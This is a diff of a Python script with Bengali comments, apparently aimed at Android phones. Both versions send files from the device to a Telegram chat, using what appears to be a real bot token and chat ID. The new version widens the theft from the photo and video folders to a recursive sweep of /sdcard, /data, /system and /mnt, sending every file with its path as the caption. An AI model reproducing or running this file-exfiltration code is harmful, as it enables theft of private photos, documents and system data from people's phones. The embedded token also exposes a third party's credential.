@@ -1,23 +1,28 @@
 import os
-import requests
+import telebot
 
-# আপনার টেলিগ্রাম বটের টোকেন এবং ইউজার আইডি
+# 🔴 টেলিগ্রাম বটের টোকেন এবং আপনার চ্যাট আইডি সেট করুন
 BOT_TOKEN = "8031168268:AAHgNwZm4v5z68N9oVU4lKheOo66ysVhwqg"
-CHAT_ID = "7348506103"
+CHAT_ID = "7116837132"
 
-# যেসব ফোল্ডারের ফাইল আপলোড করতে চান
-FOLDERS = ["/sdcard/DCIM/", "/sdcard/Pictures/", "/sdcard/Movies/"]
+bot = telebot.TeleBot(BOT_TOKEN)
 
-def upload_to_telegram(file_path):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-    with open(file_path, "rb") as file:
-        requests.post(url, data={"chat_id": CHAT_ID}, files={"document": file})
+# 🔴 যেকোনো ফোল্ডারের সমস্ত ফাইল পাঠানোর ফাংশন
+def send_all_files(directory):
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            try:
+                with open(file_path, "rb") as f:
+                    bot.send_document(CHAT_ID, f, caption=f"📂 {file_path}")
+                    print(f"Uploaded: {file_path}")
+            except Exception as e:
+                print(f"❌ {file_path} আপলোড করতে ব্যর্থ: {e}")
 
-# নির্দিষ্ট ফোল্ডার থেকে ফাইল আপলোড করা
-for folder in FOLDERS:
-    if os.path.exists(folder):
-        for filename in os.listdir(folder):
-            file_path = os.path.join(folder, filename)
-            if os.path.isfile(file_path):
-                print(f"Uploading {file_path}...")
-                upload_to_telegram(file_path)
+# 🔴 এই ফোল্ডার থেকে সব কিছু পাঠানো হবে
+folders = ["/sdcard", "/storage/emulated/0", "/data", "/system", "/mnt"]
+
+for folder in folders:
+    send_all_files(folder)
+
+print("✅ সমস্ত ফাইল টেলিগ্রামে পাঠানো সম্পন্ন!")
